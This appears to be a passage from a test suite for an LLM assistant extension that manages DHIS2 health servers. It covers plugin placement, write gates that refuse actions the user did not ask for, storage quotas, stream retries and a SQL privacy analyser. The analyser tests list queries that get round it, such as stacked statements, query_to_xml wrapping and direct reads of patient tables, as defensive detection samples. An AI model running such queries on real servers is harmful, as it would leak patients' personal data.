  ctx.fetch = () => Promise.resolve({ ok: false, status: 409, statusText: 'Conflict', type: 'basic', text: async () => JSON.stringify({ httpStatus: 'Conflict', httpStatusCode: 409, status: 'ERROR', message: 'Could not delete', response: { responseType: 'ObjectReport', errorReports: [{ message: 'Object could not be deleted because it is associated with another object: Event', errorCode: 'E4030' }] } }) });
  const del409 = await ctx.__realSafeDhis2Fetch('dataElements/a3kGcGpz8FJ', { method: 'DELETE' });
  truthy('DELETE 409 (ObjectReport) surfaces errorReports + the soft-deleted-event hint', (del409.error_details || []).some((m) => /associated with another object: Event/.test(m)) && /softDeletedEventRemoval/.test(del409._hint || ''));

  // Chrome answers a write from the extension origin with an empty 200 and
  // DHIS2 installs nothing: uploadAppZip must not call that a success.
  ctx.fetch = () => Promise.resolve({ ok: true, status: 200, type: 'basic', text: async () => '' });
  const emptyUp = await ctx.uploadAppZip(new Uint8Array([1, 2, 3]), 'ai-verify-app.zip');
  truthy('an empty 2xx upload response is "NOT installed" with an open-a-DHIS2-tab hint', /NOT installed/.test(emptyUp._error || '') && /DHIS2 tab/.test(emptyUp._hint || ''));

  // Registry wiring + intent routing.
  truthy('manage_custom_app is routed, write-capable, manual-gated, summarised, with a manual',
    ctx.__TOOL_ROUTER.manage_custom_app === true && ctx.WRITE_CAPABLE_TOOL_NAMES.has('manage_custom_app') && ctx.MANUAL_TOOLS.has('manage_custom_app')
    && typeof ctx.TOOL_SUMMARIES.manage_custom_app === 'string' && /getPropsFromParent/.test(ctx.MANUAL_EXTRAS.manage_custom_app || ''));
  const intent = ctx.detectCustomAppIntent;
  for (const t of ['Build a dashboard widget that shows ANC coverage by district', 'make an app that lists programs with their stage counts', 'create a plugin for the dashboard', 'update ai-kpi-plugin to show 4 cards', 'roll back my custom app'])
    truthy(`intent: "${t}" → manage_custom_app`, intent(t.toLowerCase()));
  for (const t of ['in the capture app create a program for tb', 'install the growth chart plugin', 'create a program indicator for anc visits', 'open the dashboard app'])
    truthy(`no intent: "${t}"`, !intent(t.toLowerCase()));
  const names = (txt) => ctx.getContextualTools({ appType: 'Dashboard' }, txt).map((x) => x.function.name);
  truthy('getContextualTools offers manage_custom_app for a widget request', names('Build a dashboard widget that shows ANC coverage').includes('manage_custom_app'));
  truthy('…and not for an ordinary indicator request', !names('create a program indicator for anc visits').includes('manage_custom_app'));

  d.baseUrl = saved.baseUrl; d.apiVersion = saved.apiVersion; d.writeAuth = saved.writeAuth;
  ctx.fetch = saved.fetch; ctx.safeDhis2Fetch = saved.sdf;
}

// ── Chat history must survive an over-quota state (live 2026-10-22) ─────────
// On a big program's Capture page programMetadata was 6.1 MB; saveState wrote
// it in the SAME set() as chatHistory, Chrome rejected the whole write
// ("Session storage quota bytes exceeded"), the catch swallowed it, and after
// the idle worker was evicted the next message ("yes install it") ran with no
// history at all.
async function runStatePersistenceChecks() {
  console.log('\nState persistence (session quota):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const realSession = chrome.storage.session;
  const saved = {};
  const QUOTA = 1_000_000; // stand-in for Chrome's 10 MB: any single value over it is rejected
  chrome.storage.session = {
    get: () => Promise.resolve({}),
    remove: () => Promise.resolve(),
    set: (obj) => {
      if (JSON.stringify(obj).length > QUOTA) return Promise.reject(new Error('Session storage quota bytes exceeded. Values were not stored.'));
      Object.assign(saved, JSON.parse(JSON.stringify(obj)));
      return Promise.resolve();
    },
  };
  const prevMeta = d.programMetadata;
  try {
    const drugs = Array.from({ length: 4000 }, (_, i) => ({ id: `opt${i}`, code: `DRUG_${i}`, displayName: `Drug number ${i} 500 mg tablet` }));
    d.programMetadata = { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programStages: [{ id: 'pHbLWI4CaxD', programStageDataElements: Array.from({ length: 15 }, () => ({ dataElement: { optionSet: { options: drugs } } })) }] };
    vm.runInContext(`conversationHistory = [
      { role: 'user', content: 'create a plugin' },
      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'manage_custom_app', arguments: '{"action":"preview"}' } }] },
      { role: 'tool', tool_call_id: 'c1', content: '{"preview":true,"preview_token":"pv-0123456789abcdef"}' },
      { role: 'assistant', content: 'Shall I install it?' },
    ];`, ctx);
    await ctx.saveState();
    truthy('chatHistory is persisted even when the program cache is over the quota', Array.isArray(saved.chatHistory) && saved.chatHistory.length === 4 && /pv-0123456789abcdef/.test(JSON.stringify(saved.chatHistory)));
    truthy('the oversized programMetadata is left out of dhis2Full (re-fetched after a restart)', saved.dhis2Full && !saved.dhis2Full.programMetadata && saved.dhis2Full.baseUrl === d.baseUrl);
    d.programMetadata = { id: 'small1', displayName: 'Small program', programStages: [] };
    await ctx.saveState();
    truthy('a normal-size programMetadata is still persisted', saved.dhis2Full && saved.dhis2Full.programMetadata && saved.dhis2Full.programMetadata.id === 'small1');
    // A history that alone is over the quota keeps its most recent turns.
    const big = 'x'.repeat(200_000);
    vm.runInContext(`conversationHistory = ${JSON.stringify(Array.from({ length: 6 }, (_, i) => [{ role: 'user', content: `turn ${i} ${big}` }, { role: 'assistant', content: `answer ${i}` }]).flat())};`, ctx);
    await ctx.saveState();
    truthy('an over-quota history is halved until it fits, newest turns kept', Array.isArray(saved.chatHistory) && saved.chatHistory.length > 0 && saved.chatHistory.length < 12 && saved.chatHistory[saved.chatHistory.length - 1].content === 'answer 5' && saved.chatHistory[0].role === 'user');
  } finally {
    chrome.storage.session = realSession;
    d.programMetadata = prevMeta;
    vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
  }
  const agentSrc = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
  const chatHandler = agentSrc.slice(agentSrc.indexOf("case 'CHAT_MESSAGE'"), agentSrc.indexOf("case 'CHAT_MESSAGE'") + 3000);
  truthy('CHAT_MESSAGE waits for the state restore before the turn reads the history', /await stateRestored;[\s\S]{0,40}await ensureConnected\(\)/.test(chatHandler));
  truthy('CHAT_MESSAGE re-fetches a programMetadata that was not persisted', /freshCtx\.programId && !dhis2\.programMetadata/.test(chatHandler));
}

// ── Plugin placement (manage_custom_app place / unplace / placements) ────────
// Formats verified 2026-10-22 against the Capture 106.2.2 bundle and the
// Tracker Plugin Configurator's saved configs on 2.42.5.1. The server here is
// an in-memory stand-in: a place → unplace round trip must leave every key
// byte-identical (after jsonb key reordering) to where it started.
async function runPlacementChecks() {
  console.log('\nPlugin placement (dashboards · Capture pages · Capture forms):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const eq = (label, got, want) => (JSON.stringify(got) === JSON.stringify(want) ? ok(label) : bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`));
  const d = ctx.__dhis2();
  const saved = { baseUrl: d.baseUrl, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, src: ctx.loadCustomAppSource, tavily: vm.runInContext('_hasTavilyKey', ctx) };

  // Tavily: browse_dhis2_docs only exists when a key is saved.
  const arch = vm.runInContext('TOOLS', ctx).find((t) => t.function.name === 'architect_metadata');
  vm.runInContext('_hasTavilyKey = false;', ctx);
  const stripped = ctx.stripUnavailableToolActions([arch])[0].function;
  truthy('no Tavily key: browse_dhis2_docs is not offered (enum, docs_query, description)', !stripped.parameters.properties.action.enum.includes('browse_dhis2_docs') && !stripped.parameters.properties.docs_query && !/browse_dhis2_docs/.test(stripped.description));
  truthy('…and the original tool definition is left untouched', arch.function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
  vm.runInContext('_hasTavilyKey = true;', ctx);
  truthy('with a Tavily key: browse_dhis2_docs is offered', ctx.stripUnavailableToolActions([arch])[0].function.parameters.properties.action.enum.includes('browse_dhis2_docs'));
  vm.runInContext(`_hasTavilyKey = ${saved.tavily};`, ctx);

  // Pure helpers.
  const KEY = 'ai-test-meds';
  const SRC = `http://localhost:8081/api/apps/${KEY}/plugin.html`;
  truthy('isPluginSourceOf: ai-test-meds never matches ai-test-meds-2', ctx.isPluginSourceOf(KEY, SRC) && !ctx.isPluginSourceOf(KEY, 'http://x/api/apps/ai-test-meds-2/plugin.html') && ctx.isPluginSourceOf(KEY, `/api/apps/${KEY}/plugin.html`));
  truthy('canonicalJson ignores object key order (jsonb reorders keys)', ctx.canonicalJson({ b: 1, a: [{ y: 2, x: 1 }] }) === ctx.canonicalJson({ a: [{ x: 1, y: 2 }], b: 1 }));
  const def = ctx.captureDefaultLayout('enrollmentOverviewLayout');
  eq('enrollment dashboard default = Capture 106 bundle default', [def.leftColumn.map((w) => w.name), def.rightColumn.map((w) => w.name)], [['StagesAndEvents'], ['QuickActions', 'ErrorWidget', 'WarningWidget', 'EnrollmentNote', 'FeedbackWidget', 'IndicatorWidget', 'TrackedEntityRelationship', 'ProfileWidget', 'EnrollmentWidget']]);
  const placed = ctx.layoutWithPlugin(def, KEY, SRC, 'right', 'top');
  truthy('layoutWithPlugin puts { type:"plugin", source } at the top of the right column', placed.layout.rightColumn[0].type === 'plugin' && placed.layout.rightColumn[0].source === SRC && placed.layout.rightColumn.length === 10);
  truthy('placing twice is a no-op (already placed)', ctx.layoutWithPlugin(placed.layout, KEY, SRC, 'left', 'bottom').already === true);
  const back = ctx.layoutWithoutPlugin(placed.layout, KEY);
  truthy('layoutWithoutPlugin removes it and the result is Capture\'s default again', back.removed === 1 && ctx.isDefaultCaptureLayout(back.layout, 'enrollmentOverviewLayout'));

  const stageCtx = {
    id: 'pHbLWI4CaxD', kind: 'program_stage', name: 'Visit', programId: 'vj5cpA2OOfZ', programName: 'Pharmacy', customForm: false,
    fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001', 'deNote00001'],
    fields: { deWeight001: { id: 'deWeight001', displayName: 'Weight' }, deHeight001: { id: 'deHeight001', displayName: 'Height' }, deBmi000001: { id: 'deBmi000001', displayName: 'BMI' }, deNote00001: { id: 'deNote00001', displayName: 'Note' } },
    sections: [{ id: 'secBody0001', name: 'Body', fieldIds: ['deWeight001', 'deHeight001', 'deBmi000001'] }, { id: 'secNote0001', name: 'Notes', fieldIds: ['deNote00001'] }],
  };
  const dflt = ctx.defaultCaptureFormConfig(stageCtx);
  eq('default form config mirrors the stage sections (Configurator format)', dflt, [{ id: 'secBody0001', name: 'Body', elements: [{ id: 'deWeight001', type: 'TrackedEntityAttribute' }, { id: 'deHeight001', type: 'TrackedEntityAttribute' }, { id: 'deBmi000001', type: 'TrackedEntityAttribute' }] }, { id: 'secNote0001', name: 'Notes', elements: [{ id: 'deNote00001', type: 'TrackedEntityAttribute' }] }]);
  truthy('a stage without sections gets one untitled section with every field', (() => { const c = ctx.defaultCaptureFormConfig({ ...stageCtx, sections: [] }); return c.length === 1 && !c[0].name && c[0].elements.length === 4; })());
  eq('a stage with a custom HTML form gets only the plugin section', ctx.defaultCaptureFormConfig({ ...stageCtx, customForm: true }), []);
  const fm = [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }, { plugin_field: 'bmi', field_id: 'deBmi000001', replace_field: true }];
  const inBody = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'body', sectionName: null, position: 'bottom' });
  const bodyEls = inBody.sections[0].elements;
  truthy('form plugin goes into the named section with the Configurator\'s fieldMap shape', bodyEls[bodyEls.length - 1].type === 'plugin' && bodyEls[bodyEls.length - 1].pluginSource === SRC
    && JSON.stringify(bodyEls[bodyEls.length - 1].fieldMap[0]) === JSON.stringify({ IdFromApp: 'deWeight001', IdFromPlugin: 'weight', objectType: 'TrackedEntityAttribute' }));
  truthy('replace_field takes the field out of the form; kept fields stay', !bodyEls.some((e) => e.id === 'deBmi000001') && bodyEls.some((e) => e.id === 'deWeight001'));
  const undone = ctx.formWithoutPlugin(inBody.sections, KEY);
  truthy('removing the plugin puts the replaced field back where the plugin was → default form again', undone.removed === 1 && ctx.canonicalJson(undone.sections) === ctx.canonicalJson(dflt));
  const own = ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm.slice(0, 2), section: null, sectionName: 'Calculator', position: 'top' });
  truthy('without section the plugin gets its own section (top), removed again with it', own.sections[0].name === 'Calculator' && own.sections[0].elements[0].type === 'plugin'
    && ctx.canonicalJson(ctx.formWithoutPlugin(own.sections, KEY).sections) === ctx.canonicalJson(dflt));
  truthy('placing in the same form twice keeps ONE plugin element (upsert)', ctx.formPluginElements(ctx.formWithPlugin(inBody.sections, stageCtx, { key: KEY, name: 'BMI', source: SRC, fieldMap: fm, section: 'Body', position: 'top' }).sections, KEY).length === 1);
  truthy('an unknown section is refused with the section list', /No section "Vitals"/.test(ctx.formWithPlugin(dflt, stageCtx, { key: KEY, name: 'x', source: SRC, fieldMap: fm, section: 'Vitals', position: 'top' })._error || ''));
  const code = "setFieldValue({ fieldId: 'bmi', value: x }); const w = values.weight; const t = values['temp'];";
  const al = ctx.pluginFieldAliasProblems(code, [{ plugin_field: 'weight' }, { plugin_field: 'height' }]);
  truthy('writing an unmapped alias is an error; reading one is a warning', al.errors.some((e) => /writes "bmi"/.test(e)) && al.warnings.some((w) => /values\.temp/.test(w)) && al.warnings.some((w) => /"height" is mapped but/.test(w)));
  truthy('field_map: a field outside the stage is refused', /not a data element of stage/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'zzzzzzzzzzz' }], stageCtx) || {})._error || ''));
  truthy('field_map: an alias mapped twice is refused', /mapped twice/.test((ctx.fieldMapProblem([{ plugin_field: 'x', field_id: 'deWeight001' }, { plugin_field: 'x', field_id: 'deHeight001' }], stageCtx) || {})._error || ''));

  // Round trips against an in-memory DHIS2.
  const server = {
    datastore: {
      capture: {
        enrollmentOverviewLayout: { OtherProg01: { leftColumn: [{ type: 'component', name: 'StagesAndEvents' }], rightColumn: [{ type: 'plugin', source: '/api/apps/someone-else/plugin.html' }] } },
        dataEntryForms: { otherStage1: [{ id: 's1', elements: [{ id: 'x1', type: 'TrackedEntityAttribute' }] }] },
      },
      'dhis2-ai-extension-backups': {},
    },
    dashboards: { dash0000001: { id: 'dash0000001', name: 'Ops', dashboardItems: [] } },
  };
  const original = JSON.parse(JSON.stringify(server.datastore.capture));
  const calls = [];
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    const method = o.method || 'GET';
    calls.push(`${method} ${p.split('?')[0]}`);
    if (p === 'apps') return [{ key: KEY, name: 'Medication widget', displayName: 'Medication widget', version: '1.0.0', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: SRC, plugin_type: 'CAPTURE', appState: 'OK' }, { key: 'ai-test-dash', name: 'Dash', developer: { company: 'dhis2-ai-assistant' }, pluginLaunchUrl: 'http://localhost:8081/api/apps/ai-test-dash/plugin.html', plugin_type: 'DASHBOARD' }];
    if (p === 'dataStore') return Object.keys(server.datastore);
    let m = p.match(/^dataStore\/([^/?]+)(?:\/([^?]+))?/);
    if (m) {
      const ns = decodeURIComponent(m[1]); const k = m[2] && decodeURIComponent(m[2]);
      const space = server.datastore[ns] || (server.datastore[ns] = {});
      if (!k) return Object.keys(space);
      if (method === 'GET') return k in space ? JSON.parse(JSON.stringify(space[k])) : { _error: 'HTTP 404', _status: 404 };
      if (method === 'POST') { if (k in space) return { _error: 'HTTP 409', _status: 409 }; space[k] = JSON.parse(JSON.stringify(o.body)); return { httpStatus: 'Created' }; }
      if (method === 'PUT') { if (!(k in space)) return { _error: 'HTTP 404', _status: 404 }; space[k] = JSON.parse(JSON.stringify(o.body)); return {}; }
      if (method === 'DELETE') { delete space[k]; return {}; }
    }
    if (p.startsWith('programs/vj5cpA2OOfZ')) return { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION', programTrackedEntityAttributes: [], programSections: [] };
    if (p.startsWith('programs/eventProg01')) return { id: 'eventProg01', displayName: 'Lab', programType: 'WITHOUT_REGISTRATION' };
    if (p.startsWith('programStages?filter=id:eq:pHbLWI4CaxD')) return { programStages: [{ id: 'pHbLWI4CaxD' }] };
    if (p.startsWith('programStages?filter=')) return { programStages: [] };
    if (p.startsWith('programStages/pHbLWI4CaxD')) return { id: 'pHbLWI4CaxD', displayName: 'Visit', formType: 'SECTION', program: { id: 'vj5cpA2OOfZ', displayName: 'Pharmacy', programType: 'WITH_REGISTRATION' },
      programStageDataElements: stageCtx.fieldIds.map((id) => ({ dataElement: { id, displayName: stageCtx.fields[id].displayName, valueType: 'NUMBER' } })),
      programStageSections: [{ id: 'secBody0001', displayName: 'Body', sortOrder: 1, dataElements: [{ id: 'deWeight001' }, { id: 'deHeight001' }, { id: 'deBmi000001' }] }, { id: 'secNote0001', displayName: 'Notes', sortOrder: 2, dataElements: [{ id: 'deNote00001' }] }] };
    if (p.startsWith('dashboards?filter=')) return { dashboards: [] };
    return { _error: `unexpected ${method} ${p}` };
  };
  ctx.loadCustomAppSource = async () => ({ aiManifest: { version: '1.0.0' }, sources: { 'plugin.jsx': "const A = ({ values, setFieldValue }) => { setFieldValue({ fieldId: 'bmi', value: values.weight / values.height }); };" } });
  d.baseUrl = 'http://localhost:8081';
  // Placement needs to have been asked for (live 2026-10-22: the model created
  // a dashboard nobody asked for after "yes, install it").
  const asked = ctx.userAskedToPlace;
  for (const t of ['Create a dashboard plugin … and add it to a new dashboard called "ai-test LLM malaria".', 'lists them as a widget on the enrollment dashboard', 'Please create and install and enrollment plugin here that lists them as a widget here', 'Add a plugin to this Initial Assessment form that reads the weight', 'yes, place it'])
    truthy(`placement asked: "${t.slice(0, 60)}"`, asked([t]));
  for (const t of ['Build a dashboard widget that shows the number of enrollments per org unit for the selected period. Show me a preview first.', 'yes, install it', 'make an app that lists programs'])
    truthy(`no placement asked: "${t.slice(0, 60)}"`, !asked([t]));
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments. Show me a preview first." }, { role: "assistant", content: "Preview passed. Shall I install it?" }];', ctx);
  truthy('place is refused when nobody asked for a placement (nothing written)', /has not asked for this plugin to be put/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' }))._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
  vm.runInContext('lastUserText = "yes please"; conversationHistory = [{ role: "user", content: "build a medication widget" }, { role: "assistant", content: "Installed. Should I add it to the Pharmacy enrollment dashboard?" }];', ctx);
  truthy('…allowed when the user says yes to the assistant\'s placement question', vm.runInContext('placementWasRequested()', ctx) === true);
  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [{ role: "user", content: "Build a dashboard widget that shows enrollments" }, { role: "assistant", content: "The dashboard widget compiled. Shall I install it?" }];', ctx);
  truthy('…but "yes" to "install this dashboard widget?" is not a placement', vm.runInContext('placementWasRequested()', ctx) === false);
  vm.runInContext('lastUserText = "add it to the enrollment dashboard of Pharmacy"; conversationHistory = [];', ctx);
  d.writeAuth = { scope: 'read_only', reason: 'verify' };
  const refused = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
  truthy('place is refused on a read-only turn (write gate)', /Refused/.test(refused._error || '') && !server.datastore.capture.enrollmentOverviewLayout.vj5cpA2OOfZ);
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  const p1 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'vj5cpA2OOfZ' });
  const lay = server.datastore.capture.enrollmentOverviewLayout;
  truthy('place enrollment_dashboard: Capture default + plugin written for that program only', p1.success === true && p1.started_from_capture_default === true
    && lay.vj5cpA2OOfZ.rightColumn[0].source === SRC && lay.vj5cpA2OOfZ.rightColumn.length === 10 && ctx.canonicalJson(lay.OtherProg01) === ctx.canonicalJson(original.enrollmentOverviewLayout.OtherProg01));
  const bk = server.datastore['dhis2-ai-extension-backups'][p1.backup.key];
  truthy('…the previous value was backed up first (manage_backups can restore it)', bk && bk.capture_config && bk.capture_config.key === 'enrollmentOverviewLayout' && ctx.canonicalJson(bk.capture_config.value) === ctx.canonicalJson(original.enrollmentOverviewLayout));
  truthy('an event program is refused for enrollment pages', /event program/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'enrollment_dashboard', program_id: 'eventProg01' }))._error || ''));
  truthy('a CAPTURE plugin is refused on a dashboard', /only DASHBOARD plugins/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'dashboard', dashboard_id: 'dash0000001' }))._error || ''));
  truthy('place refuses an unmapped setFieldValue alias', /writes "bmi"/.test((await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', field_map: [{ plugin_field: 'weight', field_id: 'deWeight001' }, { plugin_field: 'height', field_id: 'deHeight001' }] }))._error || ''));
  const p2 = await ctx.executeManageCustomApp({ action: 'place', key: KEY, target: 'form', program_stage_id: 'pHbLWI4CaxD', section: 'Body', field_map: fm });
  const form = server.datastore.capture.dataEntryForms.pHbLWI4CaxD;
  truthy('place form: the stage form is written from its sections + the plugin with the field map', p2.success === true && form.length === 2 && ctx.formPluginElements(form, KEY).length === 1 && ctx.canonicalJson(server.datastore.capture.dataEntryForms.otherStage1) === ctx.canonicalJson(original.dataEntryForms.otherStage1));
  const pl = await ctx.executeManageCustomApp({ action: 'placements', key: KEY });
  truthy('placements lists the enrollment page and the form', pl.total === 2 && pl.capture_pages[0].program_id === 'vj5cpA2OOfZ' && pl.forms[0].context_id === 'pHbLWI4CaxD' && pl.forms[0].field_map.length === 3);
  truthy('placements is a discovery (read-only) action', ctx.isDiscoveryCall('manage_custom_app', { action: 'placements' }) && !ctx.isDiscoveryCall('manage_custom_app', { action: 'place' }));
  const un = await ctx.executeManageCustomApp({ action: 'unplace', key: KEY });
  truthy('unplace removes it everywhere and drops the entries it created', un.success === true && un.removed.length === 2 && un.removed.every((r) => r.entry_removed === true));
  truthy('after unplace dataStore/capture is exactly as it was before (jsonb-equal)', ctx.canonicalJson(server.datastore.capture) === ctx.canonicalJson(original));
  const restore = await ctx.restoreFromBackup(p1.backup.key);
  truthy('manage_backups restore of a Capture backup rewrites the old value', restore.success === true && ctx.canonicalJson(server.datastore.capture.enrollmentOverviewLayout) === ctx.canonicalJson(original.enrollmentOverviewLayout));

  // Dashboard APP items.
  vm.runInContext('lastUserText = "yes, install it"; conversationHistory = [];', ctx);
  truthy('manage_dashboards refuses an APP item nobody asked to place (no route around place)', /not asked for this plugin to be put on a dashboard/.test((await ctx.checkDashboardAppItem('ai-test-dash'))._error || ''));
  vm.runInContext('lastUserText = "put the KPI plugin on the Ops dashboard";', ctx);
  const chk = await ctx.checkDashboardAppItem('ai-test-dash');
  truthy('a DASHBOARD plugin is a valid dashboard APP item', !!chk.app && !chk._error);
  truthy('a CAPTURE plugin is not', /not a dashboard plugin/.test((await ctx.checkDashboardAppItem(KEY))._error || ''));
  truthy('an app that is not installed is not', /No app with key/.test((await ctx.checkDashboardAppItem('ai-nope'))._error || ''));

  d.baseUrl = saved.baseUrl; d.writeAuth = saved.writeAuth;
  ctx.safeDhis2Fetch = saved.sdf; ctx.loadCustomAppSource = saved.src;
  vm.runInContext('conversationHistory = []; lastUserText = "";', ctx);
}

// ── A provider connection dropped mid-stream (Fireworks, live 2026-10-22) ────
// read() rejects, the handler called reader.cancel(), and cancel() on an
// errored stream returns a promise rejected with the same error — unhandled.
// Chrome logs it as an uncaught error; Node kills the process (it took the
// visual suite down before its cleanup ran).
async function runStreamDropChecks() {
  console.log('\nLLM stream dropped mid-response:');
  const unhandled = [];
  const onUnhandled = (e) => unhandled.push(String(e && e.message || e));
  process.on('unhandledRejection', onUnhandled);
  const savedFetch = ctx.fetch;
  try {
    vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
    for (const flavour of ['openai', 'anthropic']) {
      ctx.fetch = async () => new Response(new ReadableStream({
        start(c) {
          c.enqueue(new TextEncoder().encode(flavour === 'openai'
            ? 'data: {"choices":[{"index":0,"delta":{"content":"Hel"}}]}\n\n'
            : 'event: message_start\ndata: {"type":"message_start","message":{"id":"x","content":[]}}\n\n'));
          setTimeout(() => c.error(new TypeError('terminated')), 5);
        },
      }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
      if (flavour === 'anthropic') vm.runInContext(`_cachedProviderConfig = { ..._cachedProviderConfig, providerType: 'anthropic', apiBaseUrl: 'https://llm.invalid' };`, ctx);
      let err = null;
      try { await ctx.callProviderStreaming([{ role: 'user', content: 'hi' }], false, () => {}, [], 0); } catch (e) { err = e; }
      await new Promise((r) => setTimeout(r, 30));
      if (err && /terminated/.test(err.message) && !unhandled.length) ok(`${flavour}: the turn fails with the network error and nothing is left unhandled`);
      else bad(`${flavour}: err=${err && err.message} unhandled=${JSON.stringify(unhandled)}`);
      unhandled.length = 0;
    }
  } finally {
    ctx.fetch = savedFetch;
    vm.runInContext(`_cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };`, ctx);
    process.off('unhandledRejection', onUnhandled);
  }
}

// A dropped provider stream is retried like a stalled one (no text yet).
function runStreamRetryChecks() {
  console.log('\nProvider stream drops are retried before any text streams:');
  const r = ctx.isRetryableStreamDrop;
  for (const m of ['LLM stream stalled: no data from x for 60s', 'terminated', 'TypeError: network error', 'Failed to fetch', 'other side closed'])
    (r(new Error(m)) ? ok : bad)(`retryable: "${m}"`);
  for (const m of ['HTTP 401 Unauthorized', 'No API key configured', 'Invalid provider URL'])
    (!r(new Error(m)) ? ok : bad)(`not retryable: "${m}"`);
  const src = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
  (/isRetryableStreamDrop\(provErr\) && !streamStartBroadcast/.test(src) ? ok : bad)('the agent loop retries only while nothing has streamed to the panel');
}

// ── SQL views + transfer-history thread fixes (2026-10-23) ──────────────────
// A "transfer history" dashboard-plugin request failed end to end on 2.43.2:
// guessed endpoints (405/404/404/500), schemas/<tracker object> 404s, 2.40
// table names, a view nobody could read (rw------ → E4312), a false "DHIS2
// validated the SQL on save", and the user's own "install it on a dashbaord"
// refused as "not asked". Server facts verified live on 2.42.5.1 and 2.43.2.
async function runSqlViewChecks() {
  console.log('\nSQL views, privacy exception & the transfer-history thread:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const saved = { apiVersion: d.apiVersion, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, gsi: ctx.getSchemaIndex };
  const A = (sql) => ctx.analyzeSqlViewPrivacy(sql).metadataOnly;
  const TRANSFER_SQL = "with history as (select h.programownershiphistoryid as transfer_id, h.trackedentityid, h.programid, h.organisationunitid as from_ou_id, h.enddate as transferred_at, lead(h.organisationunitid) over w as next_ou_id, lead(h.createdby) over w as next_owner_createdby from programownershiphistory h window w as (partition by h.trackedentityid, h.programid order by h.enddate, h.programownershiphistoryid)) select to_char(t.transferred_at, 'YYYY-MM-DD HH24:MI') as transferred_at, p.name as program, fo.name as from_org_unit, tu.name as to_org_unit, coalesce(t.next_owner_createdby, cur.createdby) as transferred_by from history t join program p on p.programid = t.programid join trackedentity te on te.trackedentityid = t.trackedentityid and te.deleted = false join organisationunit fo on fo.organisationunitid = t.from_ou_id left join trackedentityprogramowner cur on cur.trackedentityid = t.trackedentityid and cur.programid = t.programid left join organisationunit tu on tu.organisationunitid = coalesce(t.next_ou_id, cur.organisationunitid) where t.transferred_at >= cast('${startDate}' as date) and t.transferred_at < cast('${endDate}' as date) + interval '1 day' and ('${orgUnit}' = 'ALL' or fo.path like '%' || '${orgUnit}' || '%') order by t.transferred_at desc";
  try {
    // 1. What counts as metadata-only (fail closed on anything unknown).
    const meta = [
      'select uid, name from program order by name',
      "select de.uid, de.name, os.name from dataelement de left join optionset os on os.optionsetid = de.optionsetid where de.valuetype = 'TEXT'",
      "select table_name, column_name from information_schema.columns where table_schema = 'public'",
      'with p as (select programid, name from program) select p.name, count(ps.*) from p join programstage ps on ps.programid = p.programid group by p.name',
      'select extract(year from created) y, count(*) from dataelement group by 1',
      "select o.uid from organisationunit o where o.path like '%${ou}%'",
      'select x.v from program p, lateral jsonb_array_elements(p.translations) x(v)',
      'select name from program union select name from programstage;',
      'select v.uid from eventvisualization v join eventvisualization_columns c on c.eventvisualizationid = v.eventvisualizationid',
    ];
    const notMeta = [
      'select * from trackedentity', 'select * from program, event', 'select * from program p, (select * from trackedentity) t',
      'select (select count(*) from programownershiphistory) from program', 'with event as (select * from event) select * from event',
      'with a as (select * from b), b as (select 1) select * from a', 'select * from (with t as (select 1) select * from t) x, t',
      "select query_to_xml('select * from trackedentity', true, true, '')", 'select * from program where name = ${n}', 'select * from "${t}"',
      'select * from program -- ${x}\n', 'select * from public.trackedentity', 'select * from pg_catalog.pg_stat_activity',
      'select * from program; select * from event', 'do $$ begin perform 1; end $$', 'select * from (program p join trackerevent e on true)',
      'table event', 'select * from program where uid in (table trackedentity)', 'select pg_catalog.lower(name) from program',
      'select * from program where uid = any(select uid from singleevent)', 'select * from datavalue',
      'select * from program p cross join lateral (select * from enrollment) e', 'with recursive r as (select 1) select * from r, enrollment',
      TRANSFER_SQL,
    ];
    truthy(`${meta.length} metadata queries are metadata-only (CTEs, joins, information_schema, lateral SRFs, quoted variables)`, meta.every(A));
    const leaked = notMeta.filter(A);
